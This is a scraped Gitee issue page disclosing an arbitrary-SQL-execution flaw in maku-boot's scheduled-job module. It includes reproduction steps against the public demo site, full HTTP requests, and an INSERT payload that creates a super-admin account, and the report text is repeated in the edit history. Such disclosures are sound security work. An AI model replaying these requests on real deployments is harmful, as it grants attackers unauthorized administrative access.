=== Content from gitee.com_b70af5bd_20250115_093255.html ===


[Sign in](/login)
[Sign up](/signup)

* [Explore](/explore)
* [Enterprise](/enterprises)
* [Education](/education)
* [Search](/search)
* [Help](/help)
* [Terms of use](/terms)
* [About Us](/about_us)

[![Gitee — A Git-based Code Hosting and Research Collaboration Platform](/static/images/logo.svg?t=158106664 "Gitee — A Git-based Code Hosting and Research Collaboration Platform")
![Gitee — A Git-based Code Hosting and Research Collaboration Platform](/static/images/logo-black.svg?t=158106664 "Gitee — A Git-based Code Hosting and Research Collaboration Platform")](https://gitee.com)
[Explore](/explore "Explore")[Enterprise](/enterprises "Enterprise")[Education](/education "Education")[Gitee Premium](https://gitee.cn?utm_source=giteecom "Gitee Premium")[Gitee AI](https://ai.gitee.com/?utm_sources=site_nav "Gitee AI")
[![Gitee — A Git-based Code Hosting and Research Collaboration Platform](/static/images/logo.svg?t=158106664 "Gitee — A Git-based Code Hosting and Research Collaboration Platform")
![Gitee — A Git-based Code Hosting and Research Collaboration Platform](/static/images/logo-black.svg?t=158106664 "Gitee — A Git-based Code Hosting and Research Collaboration Platform")](https://gitee.com)

![功能更新](https://cn-assets.gitee.com/assets/bulb_off-24ee940be20998aace89a3f040cbc704.svg)
![]()

I know
View Details

[Sign in](/login)[Sign up](/signup)

Fetch the repository succeeded.

[Open Source](/explore)
>
[Web Development](/explore/web-app-develop)
>
[Backend Management](/explore/backend)
&&

Donate
Please sign in before you donate.

Cancel
[Sign in](/login)

Scan WeChat QR to Pay

![]()

Cancel
Complete

Prompt
Switch to Alipay.

OK
Cancel

Watch

[Unwatch](/makunet/maku-boot/unwatch)[Watching](/makunet/maku-boot/watch)[Releases Only](/makunet/maku-boot/release_only_watch)[Ignoring](/makunet/maku-boot/ignoring_watch)

[2.1K](/makunet/maku-boot/watchers "2088")
[Star](/login)[27.1K](/makunet/maku-boot/stargazers "27062")
[Fork](/login "You must be signed in to fork a repository")[5.3K](/makunet/maku-boot/members "5294")
## [MAKU](/makunet "MAKU")/[maku-boot](/makunet/maku-boot "maku-boot")

[Code](/makunet/maku-boot)[Issues
4](/makunet/maku-boot/issues)[Pull Requests
1](/makunet/maku-boot/pulls)[Wiki](/makunet/maku-boot/wikis)[Insights](/makunet/maku-boot/graph/master)[Pipelines](/makunet/maku-boot/gitee_go)

Service

[![Logo en](/static/images/logo-en.svg)](/makunet/maku-boot/pages)[![Maven](https://cn-assets.gitee.com/assets/maven-bd58aee84f266d64d4b8ce5b006a9fcf.png)](/makunet/maku-boot/javadoc)[![Sonar mini](https://cn-assets.gitee.com/assets/sonar_mini-5e1b54bb9f6c951d97fb778ef623afea.png)
Quality Analysis](/makunet/maku-boot/quality_analyses?platform=sonar_qube)[![Jenkins for gitee](https://cn-assets.gitee.com/assets/jenkins_for_gitee-554ec65c490d0f1f18de632c48acc4e7.png)
Jenkins for Gitee](https://gitee.com/help/articles/4193)[![Cloudbase](https://cn-assets.gitee.com/assets/cloudbase-1197b95ea3398aff1df7fe17c65a6d42.png?20200925)
Tencent CloudBase](https://gitee.com/help/articles/4318)[![Cloud serverless](https://cn-assets.gitee.com/assets/cloud_serverless-686cf926ced5d6d2f1d6e606d270b81e.png)
Tencent Cloud Serverless](https://gitee.com/help/articles/4330)[![Logo](https://cn-assets.gitee.com/assets/open_sca/logo-9049ced662b2f9936b8001e6f9cc4952.png)
悬镜安全](/makunet/maku-boot/open_sca)[![Sae](https://cn-assets.gitee.com/assets/SAE-f3aa9366a1e2b7fff4747402eb8f10c3.png)
Aliyun SAE](https://help.gitee.com/devops/connect/Aliyun-SAE)[![Codeblitz](https://cn-assets.gitee.com/assets/Codeblitz-8824e38875a106e16e29ff57ec977b08.png)
Codeblitz](https://codeblitz.cloud.alipay.com/gitee/makunet/maku-boot/tree/master)
Don’t show this again

Update failed. Please try again later!

[Issues](/makunet/maku-boot/issues)

 /
详情

Remove this flag
#### Content Risk Flag

This task is identified by  as the content contains sensitive information such as code security bugs, privacy leaks, etc., so it is only accessible to contributors of this repository.

## Any sql statement execution vulnerability

Done

#I5ZUYI

[TGAO](/h3110n3w0r11d)
Opened this issue
2022-11-07 16:16

# Impact
version：maku-boot v1.3.0-v2.2.0
Users with "schedule" permissions can execute arbitrary sql statements, even rce
# Code Audit
The vulnerability code is located at:
1. https://github.com/makunet/maku-boot/blob/master/maku-boot-module/maku-module-quartz/src/main/java/net/maku/quartz/utils/AbstractScheduleJob.java
2. https://gitee.com/makunet/maku-boot/blob/master/maku-boot-module/maku-module-quartz/src/main/java/net/maku/quartz/utils/AbstractScheduleJob.java
![输入图片说明](https://foruda.gitee.com/images/1667808240251945137/4d5c68cd\_7554608.png "屏幕截图")
Need to find an exploitable method that satisfies the following conditions：
- The class that defines the method is in the spring bean container.
- The method has only one parameter, and the parameter type must be a string.
- The method must be public.
Deploy maku-boot locally and write auxiliary code to find a method that meets the above conditions：
![输入图片说明](https://foruda.gitee.com/images/1667808383286945065/8b0e5562\_7554608.png "屏幕截图")
Visit http://localhost:8080/index
![输入图片说明](https://foruda.gitee.com/images/1667808449923334431/b1194390\_7554608.png "屏幕截图")
Find `org.springframework.jdbc.core.JdbcTemplate#execute(java.lang.String)` method, this method can perform any SQL statement
The next section is the exploit procedure
# Steps to reproduce
Visit the official demo site: https://demo.maku.net/maku-boot/#/login
1. Log in as user name 'admin' and password 'admin'.
![输入图片说明](https://foruda.gitee.com/images/1667808579488486231/11b4d649\_7554608.png "屏幕截图")
2. Go to https://demo.maku.net/maku-boot/#/quartz/schedule/index and add timing task after a successful login.
Click the Add button in the image below.
![输入图片说明](https://foruda.gitee.com/images/1667808620076091922/1ce923f4\_7554608.png "屏幕截图")
Fill in the following important parameters and click the submit button in the image below：
- bean name: jdbcTemplate
- method name: execute
- method param: `INSERT INTO sys\_user (id, username, password, real\_name, avatar, gender, email, mobile, status, org\_id, super\_admin, version, deleted, creator, create\_time, updater, update\_time) VALUES (10099, 'test123', '{bcrypt}$2a$10$mW/yJPHjyueQ1g26WNBz0uxVPa0GQdJO1fFZmqdkqgMTGnyszlXxu', 'test', 'https://cdn.maku.net/images/avatar.png', 0, 'babamu@126.cn', '13612345586', 1, null, 1, 0, 0, 10000, now(), 10000, now());`
![输入图片说明](https://foruda.gitee.com/images/1667808853095969168/f55a4911\_7554608.png "屏幕截图")
The packet is as follows：
```
POST /maku-boot-server/schedule HTTP/1.1
Host: demo.maku.net
Cookie: Hm\_lvt\_dd01f60c05c4a94d3287dd7c580372ff=1667440588; Hm\_lpvt\_dd01f60c05c4a94d3287dd7c580372ff=1667468738
Content-Length: 583
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"
Accept-Language: zh-CN
Sec-Ch-Ua-Mobile: ?0
Authorization: 06f170e5cdbf4c83b5e3ba5ffc4cde98
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, \*/\*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://demo.maku.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://demo.maku.net/maku-boot/
Accept-Encoding: gzip, deflate
Connection: close
{"id":"","jobName":"test","jobGroup":"default","beanName":"jdbcTemplate","method":"execute","params":"INSERT INTO sys\_user (id, username, password, real\_name, avatar, gender, email, mobile, status, org\_id, super\_admin, version, deleted, creator, create\_time, updater, update\_time) VALUES (10099, 'test123', '{bcrypt}$2a$10$mW/yJPHjyueQ1g26WNBz0uxVPa0GQdJO1fFZmqdkqgMTGnyszlXxu', 'test', 'https://cdn.maku.net/images/avatar.png', 0, 'babamu@126.cn', '13612345586', 1, null, 1, 0, 0, 10000, now(), 10000, now());","cronExpression":"\* \* \* \* \* ? \*","status":0,"concurrent":1,"remark":""}
```
3. Click the run button in the image below to execute the scheduled task you just created.
![输入图片说明](https://foruda.gitee.com/images/1667808937120721928/dc13ab0a\_7554608.png "屏幕截图")
The packet is as follows：
```
PUT /maku-boot-server/schedule/run HTTP/1.1
Host: demo.maku.net
Cookie: Hm\_lvt\_dd01f60c05c4a94d3287dd7c580372ff=1667440588; Hm\_lpvt\_dd01f60c05c4a94d3287dd7c580372ff=1667468738
Content-Length: 618
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"
Accept-Language: zh-CN
Sec-Ch-Ua-Mobile: ?0
Authorization: 06f170e5cdbf4c83b5e3ba5ffc4cde98
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, \*/\*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://demo.maku.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://demo.maku.net/maku-boot/
Accept-Encoding: gzip, deflate
Connection: close
{"id":24,"jobName":"test","jobGroup":"default","beanName":"jdbcTemplate","method":"execute","params":"INSERT INTO sys\_user (id, username, password, real\_name, avatar, gender, email, mobile, status, org\_id, super\_admin, version, deleted, creator, create\_time, updater, update\_time) VALUES (10099, 'test123', '{bcrypt}$2a$10$mW/yJPHjyueQ1g26WNBz0uxVPa0GQdJO1fFZmqdkqgMTGnyszlXxu', 'test', 'https://cdn.maku.net/images/avatar.png', 0, 'babamu@126.cn', '13612345586', 1, null, 1, 0, 0, 10000, now(), 10000, now());","cronExpression":"\* \* \* \* \* ? \*","status":0,"concurrent":1,"remark":"","createTime":"2022-11-07 11:23:34"}
```
After the sql statement is successfully executed, an administrator user test123/admin is created
4. Log in to the system as test123/admin
![输入图片说明](https://foruda.gitee.com/images/1667809015950851195/f9b1cd5e\_7554608.png "屏幕截图")
The packet is as follows：
```
POST /maku-boot-server/sys/auth/login HTTP/1.1
Host: demo.maku.net
Cookie: Hm\_lvt\_dd01f60c05c4a94d3287dd7c580372ff=1667440588; Hm\_lpvt\_dd01f60c05c4a94d3287dd7c580372ff=1667468738
Content-Length: 104
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"
Accept: application/json, text/plain, \*/\*
Content-Type: application/json;charset=UTF-8
Accept-Language: zh-CN
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://demo.maku.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://demo.maku.net/maku-boot/
Accept-Encoding: gzip, deflate
Connection: close
{"username":"test123","password":"admin","key":"30aef83e-2804-49ea-acb5-b5678cdc27dc","captcha":"bdrgr"}
```
Login successful
![输入图片说明](https://foruda.gitee.com/images/1667809061927753546/2c2c6ffa\_7554608.png "屏幕截图")
In addition, any sql statements can be executed, and the maku-boot program supports mysql and postgresql databases. Therefore, the udf may upgrade permissions and execute commands

# Impact
version：maku-boot v1.3.0-v2.2.0
Users with "schedule" permissions can execute arbitrary sql statements, even rce
# Code Audit
The vulnerability code is located at:
1. https://github.com/makunet/maku-boot/blob/master/maku-boot-module/maku-module-quartz/src/main/java/net/maku/quartz/utils/AbstractScheduleJob.java
2. https://gitee.com/makunet/maku-boot/blob/master/maku-boot-module/maku-module-quartz/src/main/java/net/maku/quartz/utils/AbstractScheduleJob.java
![输入图片说明](https://foruda.gitee.com/images/1667808240251945137/4d5c68cd\_7554608.png "屏幕截图")
Need to find an exploitable method that satisfies the following conditions：
- The class that defines the method is in the spring bean container.
- The method has only one parameter, and the parameter type must be a string.
- The method must be public.
Deploy maku-boot locally and write auxiliary code to find a method that meets the above conditions：
![输入图片说明](https://foruda.gitee.com/images/1667808383286945065/8b0e5562\_7554608.png "屏幕截图")
Visit http://localhost:8080/index
![输入图片说明](https://foruda.gitee.com/images/1667808449923334431/b1194390\_7554608.png "屏幕截图")
Find `org.springframework.jdbc.core.JdbcTemplate#execute(java.lang.String)` method, this method can perform any SQL statement
The next section is the exploit procedure
# Steps to reproduce
Visit the official demo site: https://demo.maku.net/maku-boot/#/login
1. Log in as user name 'admin' and password 'admin'.
![输入图片说明](https://foruda.gitee.com/images/1667808579488486231/11b4d649\_7554608.png "屏幕截图")
2. Go to https://demo.maku.net/maku-boot/#/quartz/schedule/index and add timing task after a successful login.
Click the Add button in the image below.
![输入图片说明](https://foruda.gitee.com/images/1667808620076091922/1ce923f4\_7554608.png "屏幕截图")
Fill in the following important parameters and click the submit button in the image below：
- bean name: jdbcTemplate
- method name: execute
- method param: `INSERT INTO sys\_user (id, username, password, real\_name, avatar, gender, email, mobile, status, org\_id, super\_admin, version, deleted, creator, create\_time, updater, update\_time) VALUES (10099, 'test123', '{bcrypt}$2a$10$mW/yJPHjyueQ1g26WNBz0uxVPa0GQdJO1fFZmqdkqgMTGnyszlXxu', 'test', 'https://cdn.maku.net/images/avatar.png', 0, 'babamu@126.cn', '13612345586', 1, null, 1, 0, 0, 10000, now(), 10000, now());`
![输入图片说明](https://foruda.gitee.com/images/1667808853095969168/f55a4911\_7554608.png "屏幕截图")
The packet is as follows：
```
POST /maku-boot-server/schedule HTTP/1.1
Host: demo.maku.net
Cookie: Hm\_lvt\_dd01f60c05c4a94d3287dd7c580372ff=1667440588; Hm\_lpvt\_dd01f60c05c4a94d3287dd7c580372ff=1667468738
Content-Length: 583
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"
Accept-Language: zh-CN
Sec-Ch-Ua-Mobile: ?0
Authorization: 06f170e5cdbf4c83b5e3ba5ffc4cde98
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, \*/\*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://demo.maku.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://demo.maku.net/maku-boot/
Accept-Encoding: gzip, deflate
Connection: close
{"id":"","jobName":"test","jobGroup":"default","beanName":"jdbcTemplate","method":"execute","params":"INSERT INTO sys\_user (id, username, password, real\_name, avatar, gender, email, mobile, status, org\_id, super\_admin, version, deleted, creator, create\_time, updater, update\_time) VALUES (10099, 'test123', '{bcrypt}$2a$10$mW/yJPHjyueQ1g26WNBz0uxVPa0GQdJO1fFZmqdkqgMTGnyszlXxu', 'test', 'https://cdn.maku.net/images/avatar.png', 0, 'babamu@126.cn', '13612345586', 1, null, 1, 0, 0, 10000, now(), 10000, now());","cronExpression":"\* \* \* \* \* ? \*","status":0,"concurrent":1,"remark":""}
```
3. Click the run button in the image below to execute the scheduled task you just created.
![输入图片说明](https://foruda.gitee.com/images/1667808937120721928/dc13ab0a\_7554608.png "屏幕截图")
The packet is as follows：
```
PUT /maku-boot-server/schedule/run HTTP/1.1
Host: demo.maku.net
Cookie: Hm\_lvt\_dd01f60c05c4a94d3287dd7c580372ff=1667440588; Hm\_lpvt\_dd01f60c05c4a94d3287dd7c580372ff=1667468738
Content-Length: 618
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"
Accept-Language: zh-CN
Sec-Ch-Ua-Mobile: ?0
Authorization: 06f170e5cdbf4c83b5e3ba5ffc4cde98
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, \*/\*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://demo.maku.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://demo.maku.net/maku-boot/
Accept-Encoding: gzip, deflate
Connection: close
{"id":24,"jobName":"test","jobGroup":"default","beanName":"jdbcTemplate","method":"execute","params":"INSERT INTO sys\_user (id, username, password, real\_name, avatar, gender, email, mobile, status, org\_id, super\_admin, version, deleted, creator, create\_time, updater, update\_time) VALUES (10099, 'test123', '{bcrypt}$2a$10$mW/yJPHjyueQ1g26WNBz0uxVPa0GQdJO1fFZmqdkqgMTGnyszlXxu', 'test', 'https://cdn.maku.net/images/avatar.png', 0, 'babamu@126.cn', '13612345586', 1, null, 1, 0, 0, 10000, now(), 10000, now());","cronExpression":"\* \* \* \* \* ? \*","status":0,"concurrent":1,"remark":"","createTime":"2022-11-07 11:23:34"}
```
After the sql statement is successfully executed, an administrator user test123/admin is created
4. Log in to the system as test123/admin
![输入图片说明](https://foruda.gitee.com/images/1667809015950851195/f9b1cd5e\_7554608.png "屏幕截图")
The packet is as follows：
```
POST /maku-boot-server/sys/auth/login HTTP/1.1
Host: demo.maku.net
Cookie: Hm\_lvt\_dd01f60c05c4a94d3287dd7c580372ff=1667440588; Hm\_lpvt\_dd01f60c05c4a94d3287dd7c580372ff=1667468738
Content-Length: 104
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"
Accept: application/json, text/plain, \*/\*
Content-Type: application/json;charset=UTF-8
Accept-Language: zh-CN
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://demo.maku.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://demo.maku.net/maku-boot/
Accept-Encoding: gzip, deflate
Connection: close
{"username":"test123","password":"admin","key":"30aef83e-2804-49ea-acb5-b5678cdc27dc","captcha":"bdrgr"}
```
Login successful
![输入图片说明](https://foruda.gitee.com/images/1667809061927753546/2c2c6ffa\_7554608.png "屏幕截图")
In addition, any sql statements can be executed, and the maku-boot program supports mysql and postgresql databases. Therefore, the udf may upgrade permissions and execute commands

### Comments (1)

[![7554608 h3110n3w0r11d 1670478742](https://foruda.gitee.com/avatar/1670478742927774372/7554608_h3110n3w0r11d_1670478742.png!avatar100)](/h3110n3w0r11d "h3110n3w0r11d")
[TGAO](/h3110n3w0r11d "h3110n3w0r11d") created**任务**

[![7554608 h3110n3w0r11d 1670478742](https://foruda.gitee.com/avatar/1670478742927774372/7554608_h3110n3w0r11d_1670478742.png!avatar100)](/h3110n3w0r11d "h3110n3w0r11d")
[TGAO](/h3110n3w0r11d "h3110n3w0r11d") changed **description**

Original content
# Impact

version：maku-boot v1.3.0-v2.2.0

Users with "schedule" permissions can execute arbitrary sql statements, even rce

# Code Audit

The vulnerability code is located at:

1. https://github.com/makunet/maku-boot/blob/master/maku-boot-module/maku-module-quartz/src/main/java/net/maku/quartz/utils/AbstractScheduleJob.java

2. https://gitee.com/makunet/maku-boot/blob/master/maku-boot-module/maku-module-quartz/src/main/java/net/maku/quartz/utils/AbstractScheduleJob.java

![输入图片说明](https://foruda.gitee.com/images/1667808240251945137/4d5c68cd\_7554608.png "屏幕截图")

Need to find an exploitable method that satisfies the following conditions：

- The class that defines the method is in the spring bean container.

- The method has only one parameter, and the parameter type must be a string.

- The method must be public.

Deploy maku-boot locally and write auxiliary code to find a method that meets the above conditions：

![输入图片说明](https://foruda.gitee.com/images/1667808383286945065/8b0e5562\_7554608.png "屏幕截图")

Visit http://localhost:8080/index

![输入图片说明](https://foruda.gitee.com/images/1667808449923334431/b1194390\_7554608.png "屏幕截图")

Find `org.springframework.jdbc.core.JdbcTemplate#execute(java.lang.String)` method, this method can perform any SQL statement

The next section is the exploit procedure

# Steps to reproduce

Visit the official demo site: https://demo.maku.net/maku-boot/#/login

1. Log in as user name 'admin' and password 'admin'.

![输入图片说明](https://foruda.gitee.com/images/1667808579488486231/11b4d649\_7554608.png "屏幕截图")

2. Go to https://demo.maku.net/maku-boot/#/quartz/schedule/index and add timing task after a successful login.

Click the Add button in the image below.

![输入图片说明](https://foruda.gitee.com/images/1667808620076091922/1ce923f4\_7554608.png "屏幕截图")

Fill in the following important parameters and click the submit button in the image below：

- bean name: jdbcTemplate

- method name: execute

- method param: `INSERT INTO sys\_user (id, username, password, real\_name, avatar, gender, email, mobile, status, org\_id, super\_admin, version, deleted, creator, create\_time, updater, update\_time) VALUES (10099, 'test123', '{bcrypt}$2a$10$mW/yJPHjyueQ1g26WNBz0uxVPa0GQdJO1fFZmqdkqgMTGnyszlXxu', 'test', 'https://cdn.maku.net/images/avatar.png', 0, 'babamu@126.cn', '13612345586', 1, null, 1, 0, 0, 10000, now(), 10000, now());`

![输入图片说明](https://foruda.gitee.com/images/1667808853095969168/f55a4911\_7554608.png "屏幕截图")

The packet is as follows：

```

POST /maku-boot-server/schedule HTTP/1.1

Host: demo.maku.net

Cookie: Hm\_lvt\_dd01f60c05c4a94d3287dd7c580372ff=1667440588; Hm\_lpvt\_dd01f60c05c4a94d3287dd7c580372ff=1667468738

Content-Length: 583

Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"

Accept-Language: zh-CN

Sec-Ch-Ua-Mobile: ?0

Authorization: 06f170e5cdbf4c83b5e3ba5ffc4cde98

Content-Type: application/json;charset=UTF-8

Accept: application/json, text/plain, \*/\*

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36

Sec-Ch-Ua-Platform: "Windows"

Origin: https://demo.maku.net

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://demo.maku.net/maku-boot/

Accept-Encoding: gzip, deflate

Connection: close

{"id":"","jobName":"test","jobGroup":"default","beanName":"jdbcTemplate","method":"execute","params":"INSERT INTO sys\_user (id, username, password, real\_name, avatar, gender, email, mobile, status, org\_id, super\_admin, version, deleted, creator, create\_time, updater, update\_time) VALUES (10099, 'test123', '{bcrypt}$2a$10$mW/yJPHjyueQ1g26WNBz0uxVPa0GQdJO1fFZmqdkqgMTGnyszlXxu', 'test', 'https://cdn.maku.net/images/avatar.png', 0, 'babamu@126.cn', '13612345586', 1, null, 1, 0, 0, 10000, now(), 10000, now());","cronExpression":"\* \* \* \* \* ? \*","status":0,"concurrent":1,"remark":""}

```

3. Click the run button in the image below to execute the scheduled task you just created.

![输入图片说明](https://foruda.gitee.com/images/1667808937120721928/dc13ab0a\_7554608.png "屏幕截图")

The packet is as follows：

```

PUT /maku-boot-server/schedule/run HTTP/1.1

Host: demo.maku.net

Cookie: Hm\_lvt\_dd01f60c05c4a94d3287dd7c580372ff=1667440588; Hm\_lpvt\_dd01f60c05c4a94d3287dd7c580372ff=1667468738

Content-Length: 618

Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"

Accept-Language: zh-CN

Sec-Ch-Ua-Mobile: ?0

Authorization: 06f170e5cdbf4c83b5e3ba5ffc4cde98

Content-Type: application/json;charset=UTF-8

Accept: application/json, text/plain, \*/\*

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36

Sec-Ch-Ua-Platform: "Windows"

Origin: https://demo.maku.net

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://demo.maku.net/maku-boot/

Accept-Encoding: gzip, deflate

Connection: close

{"id":24,"jobName":"test","jobGroup":"default","beanName":"jdbcTemplate","method":"execute","params":"INSERT INTO sys\_user (id, username, password, real\_name, avatar, gender, email, mobile, status, org\_id, super\_admin, version, deleted, creator, create\_time, updater, update\_time) VALUES (10099, 'test123', '{bcrypt}$2a$10$mW/yJPHjyueQ1g26WNBz0uxVPa0GQdJO1fFZmqdkqgMTGnyszlXxu', 'test', 'https://cdn.maku.net/images/avatar.png', 0, 'babamu@126.cn', '13612345586', 1, null, 1, 0, 0, 10000, now(), 10000, now());","cronExpression":"\* \* \* \* \* ? \*","status":0,"concurrent":1,"remark":"","createTime":"2022-11-07 11:23:34"}

```

New content
# Impact

version：maku-boot v1.3.0-v2.2.0

Users with "schedule" permissions can execute arbitrary sql statements, even rce

# Code Audit

The vulnerability code is located at:

1. https://github.com/makunet/maku-boot/blob/master/maku-boot-module/maku-module-quartz/src/main/java/net/maku/quartz/utils/AbstractScheduleJob.java

2. https://gitee.com/makunet/maku-boot/blob/master/maku-boot-module/maku-module-quartz/src/main/java/net/maku/quartz/utils/AbstractScheduleJob.java

![输入图片说明](https://foruda.gitee.com/images/1667808240251945137/4d5c68cd\_7554608.png "屏幕截图")

Need to find an exploitable method that satisfies the following conditions：

- The class that defines the method is in the spring bean container.

- The method has only one parameter, and the parameter type must be a string.

- The method must be public.

Deploy maku-boot locally and write auxiliary code to find a method that meets the above conditions：

![输入图片说明](https://foruda.gitee.com/images/1667808383286945065/8b0e5562\_7554608.png "屏幕截图")

Visit http://localhost:8080/index

![输入图片说明](https://foruda.gitee.com/images/1667808449923334431/b1194390\_7554608.png "屏幕截图")

Find `org.springframework.jdbc.core.JdbcTemplate#execute(java.lang.String)` method, this method can perform any SQL statement

The next section is the exploit procedure

# Steps to reproduce

Visit the official demo site: https://demo.maku.net/maku-boot/#/login

1. Log in as user name 'admin' and password 'admin'.

![输入图片说明](https://foruda.gitee.com/images/1667808579488486231/11b4d649\_7554608.png "屏幕截图")

2. Go to https://demo.maku.net/maku-boot/#/quartz/schedule/index and add timing task after a successful login.

Click the Add button in the image below.

![输入图片说明](https://foruda.gitee.com/images/1667808620076091922/1ce923f4\_7554608.png "屏幕截图")

Fill in the following important parameters and click the submit button in the image below：

- bean name: jdbcTemplate

- method name: execute

- method param: `INSERT INTO sys\_user (id, username, password, real\_name, avatar, gender, email, mobile, status, org\_id, super\_admin, version, deleted, creator, create\_time, updater, update\_time) VALUES (10099, 'test123', '{bcrypt}$2a$10$mW/yJPHjyueQ1g26WNBz0uxVPa0GQdJO1fFZmqdkqgMTGnyszlXxu', 'test', 'https://cdn.maku.net/images/avatar.png', 0, 'babamu@126.cn', '13612345586', 1, null, 1, 0, 0, 10000, now(), 10000, now());`

![输入图片说明](https://foruda.gitee.com/images/1667808853095969168/f55a4911\_7554608.png "屏幕截图")

The packet is as follows：

```

POST /maku-boot-server/schedule HTTP/1.1

Host: demo.maku.net

Cookie: Hm\_lvt\_dd01f60c05c4a94d3287dd7c580372ff=1667440588; Hm\_lpvt\_dd01f60c05c4a94d3287dd7c580372ff=1667468738

Content-Length: 583

Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"

Accept-Language: zh-CN

Sec-Ch-Ua-Mobile: ?0

Authorization: 06f170e5cdbf4c83b5e3ba5ffc4cde98

Content-Type: application/json;charset=UTF-8

Accept: application/json, text/plain, \*/\*

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36

Sec-Ch-Ua-Platform: "Windows"

Origin: https://demo.maku.net

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://demo.maku.net/maku-boot/

Accept-Encoding: gzip, deflate

Connection: close

{"id":"","jobName":"test","jobGroup":"default","beanName":"jdbcTemplate","method":"execute","params":"INSERT INTO sys\_user (id, username, password, real\_name, avatar, gender, email, mobile, status, org\_id, super\_admin, version, deleted, creator, create\_time, updater, update\_time) VALUES (10099, 'test123', '{bcrypt}$2a$10$mW/yJPHjyueQ1g26WNBz0uxVPa0GQdJO1fFZmqdkqgMTGnyszlXxu', 'test', 'https://cdn.maku.net/images/avatar.png', 0, 'babamu@126.cn', '13612345586', 1, null, 1, 0, 0, 10000, now(), 10000, now());","cronExpression":"\* \* \* \* \* ? \*","status":0,"concurrent":1,"remark":""}

```

3. Click the run button in the image below to execute the scheduled task you just created.

![输入图片说明](https://foruda.gitee.com/images/1667808937120721928/dc13ab0a\_7554608.png "屏幕截图")

The packet is as follows：

```

PUT /maku-boot-server/schedule/run HTTP/1.1

Host: demo.maku.net

Cookie: Hm\_lvt\_dd01f60c05c4a94d3287dd7c580372ff=1667440588; Hm\_lpvt\_dd01f60c05c4a94d3287dd7c580372ff=1667468738

Content-Length: 618

Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"

Accept-Language: zh-CN

Sec-Ch-Ua-Mobile: ?0

Authorization: 06f170e5cdbf4c83b5e3ba5ffc4cde98

Content-Type: application/json;charset=UTF-8

Accept: application/json, text/plain, \*/\*

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36

Sec-Ch-Ua-Platform: "Windows"

Origin: https://demo.maku.net

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://demo.maku.net/maku-boot/

Accept-Encoding: gzip, deflate

Connection: close

